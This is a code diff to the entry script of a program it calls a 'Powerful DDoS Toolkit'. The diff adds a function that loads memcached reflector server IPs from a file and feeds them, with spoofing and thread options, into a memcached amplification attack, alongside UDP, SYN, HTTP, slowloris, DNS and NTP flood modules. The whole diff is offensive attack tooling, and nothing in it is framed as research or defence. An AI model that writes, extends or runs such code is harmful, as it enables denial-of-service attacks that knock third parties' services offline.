@@ -2,8 +2,24 @@
 import argparse
 import sys
 import time
+import os
 from attacks import udp_flood, syn_flood, icmp_flood, tcp_flood, http_flood, slowloris, dns_amp, ntp_amp, memcached_amp
 from core.real_ip import detect_real_ip
+
+def load_memcached_servers():
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    ip_file = os.path.join(script_dir, "all-ipv4-ClassC-192,168", "all_ip.txt")
+    if not os.path.exists(ip_file):
+        print(f"[!] File tidak ditemukan: {ip_file}")
+        return None
+    servers = []
+    with open(ip_file, "r") as f:
+        for line in f:
+            line = line.strip()
+            if line:
+                servers.append(line)
+    print(f"[+] Loaded {len(servers)} server IPs from {ip_file}")
+    return servers
 
 def main():
     parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit")
@@ -39,11 +55,17 @@ def main():
         "slowloris": slowloris.attack,
         "dns": dns_amp.attack,
         "ntp": ntp_amp.attack,
-        "memcached": memcached_amp.attack,
     }
 
     try:
-        method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
+        if args.method == "memcached":
+            servers = load_memcached_servers()
+            if not servers:
+                print("[!] Gagal memuat all_ip.txt")
+                sys.exit(1)
+            memcached_amp.attack(target, args.port, args.threads, args.duration, args.spoof, servers)
+        else:
+            method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
     except KeyboardInterrupt:
         print("\n[!] Attack stopped")
     except PermissionError:
